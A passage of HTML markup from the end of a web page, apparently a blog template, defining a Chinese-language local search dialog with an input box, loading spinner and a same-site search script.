class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
